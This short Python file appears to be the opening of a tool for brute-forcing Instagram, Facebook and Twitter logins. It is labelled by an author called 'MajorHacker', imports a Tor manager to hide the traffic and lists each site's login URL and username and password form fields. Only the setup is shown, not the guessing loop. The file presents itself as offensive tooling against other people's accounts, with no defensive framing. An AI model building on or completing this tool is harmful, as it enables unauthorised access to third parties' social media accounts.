# Date: 08/09/2017
# Distro: Kali Linux
# Author: MajorHacker
# Description: Bruteforce Instagram, Facebook and Twitter
#
#
import os
import time
import argparse
import threading
import subprocess
from platform import platform
from Core.tor import TorManager
from Core.browser import Browser

sites = {
        'twitter':{
          'name':'Twitter',
          'url':'https://m.twitter.com/login/',
          'form1':'session[username_or_email]',
          'form2':'session[password]'
         },

        'facebook':{
          'name':'Facebook',
          'url':'https://mbasic.facebook.com/login.php',
          'form1':'email',
          'form2':'pass'
         },

        'instagram':{
          'name':'Instagram',
          'url':'https://www.instagram.com/accounts/login/?force_classic_login',
          'form1':'username',
          'form2':'password'
          }
}

